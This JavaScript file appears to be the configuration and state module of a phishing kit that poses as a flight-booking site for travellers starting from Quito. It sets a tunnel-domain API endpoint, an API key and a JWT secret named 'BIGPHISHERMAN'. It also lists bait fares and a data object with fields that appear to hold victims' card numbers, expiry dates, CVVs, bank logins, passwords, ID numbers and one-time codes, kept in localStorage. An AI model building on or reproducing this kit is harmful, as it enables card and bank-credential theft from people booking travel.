/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://tunnel.divinasmarranologosdante.shop'; // Cambiar según convenga.
const API_KEY = '04f70a0b-084f-4c05-8ecf-f3d6d6e8b481'; // Cambiar según convenga.
const JWT_SIGN = 'BIGPHISHERMAN';

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }
];

const pricesNAC = {
    "flight_1": { "xs": 21.95, "s": 17.95, "m": 22.95 },
    "flight_2": { "xs": 13.95, "s": 18.95, "m": 22.95 },
    "flight_3": { "xs": 19.95, "s": 27.95, "m": 32.95 },
    "flight_4": { "xs": 19.95, "s": 27.95, "m": 32.95 },
    "flight_5": { "xs": 19.95, "s": 27.95, "m": 32.95 },
    // NUEVOS
    "flight_6": { "xs": 22.95, "s": 31.95, "m": 37.95 },
    "flight_7": { "xs": 23.95, "s": 33.95, "m": 39.95 },
    "flight_8": { "xs": 24.95, "s": 35.95, "m": 41.95 },
    "flight_9": { "xs": 25.95, "s": 37.95, "m": 43.95 },
    "flight_10":{ "xs": 26.95, "s": 39.95, "m": 45.95 }
};

const pricesINT = {
    flight_1:{ xs: 359900, s: 389000, m: 410900 },
    flight_2:{ xs: 389000, s: 428900, m: 478900 },
    flight_3:{ xs: 529000, s: 569000, m: 599900 },
    // NUEVOS
    flight_4:{ xs: 549000, s: 589000, m: 629000 },
    flight_5:{ xs: 569000, s: 609000, m: 649000 },
    flight_6:{ xs: 589000, s: 629000, m: 669000 },
    flight_7:{ xs: 609000, s: 649000, m: 689000 },
    flight_8:{ xs: 629000, s: 669000, m: 709000 },
    flight_9:{ xs: 649000, s: 689000, m: 729000 },
    flight_10:{ xs: 669000, s: 709000, m: 749000 }
};

let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "Quito",
            country: "Ecuador",
            code: "UIO"
        },
        destination: {
            // se completa en el flujo
        },
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,
    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '---',
        puser: '---',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
};

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value);
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')) {
        info.metaInfo.disp = "iOS";
    } else if (userAgent.includes('Windows')) {
        info.metaInfo.disp = "PC";
    } else {
        info.metaInfo.disp = "Android";
    }
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));
